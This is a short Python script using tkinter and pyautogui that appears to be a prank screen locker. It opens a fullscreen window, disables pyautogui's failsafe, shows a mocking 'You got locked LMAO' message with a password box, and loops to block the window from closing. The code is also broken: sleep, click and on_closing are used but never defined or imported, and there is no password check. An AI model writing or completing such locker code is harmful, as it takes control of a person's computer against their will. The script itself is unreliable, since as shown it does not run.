import pyautogui
from tkinter import Tk, Entry, Label
root = Tk()
pyautogui.FAILSAFE = False
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
root.title('LOL')
root.attributes("-fullscreen", True)
entry = Entry(root, font = 1)
entry.place(width = 150, height = 50, x = width/2 - 75, y = height/2 -25)
label0 = Label(root, text = "╚(•⌂•)╝ You got locked LMAO (╯°□°）╯︵ ┻━┻", font=1)
label0.grid(row = 0, column = 0)
label1 = Label(root, text = "Type password and press Ctrl+C", font = 'Arial 20')
label1.place(x = width/2 -75 - 130, y = height/2 - 25 - 100)
root.update()
sleep(0.2)
click(width/2, height/2)
k = False
while not k:
    on_closing()
